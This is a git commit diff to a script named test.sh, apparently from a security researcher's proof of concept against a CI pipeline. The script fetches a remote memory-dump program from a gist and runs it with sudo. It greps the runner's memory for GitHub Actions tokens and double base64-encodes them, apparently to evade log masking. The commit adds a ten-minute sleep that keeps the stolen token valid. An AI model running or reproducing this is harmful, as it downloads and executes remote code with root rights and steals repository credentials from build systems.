4463c4699c27448fb7643bdf83591c432772d963
sectest-h1-adnanthekhan <136088118+sectest-h1-adnanthekhan@users.noreply.github.com>
2023-06-26 22:24:39 -0400

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,3 +1,5 @@
 #!/bin/bash
 
 curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 | base64
+
+sleep 600
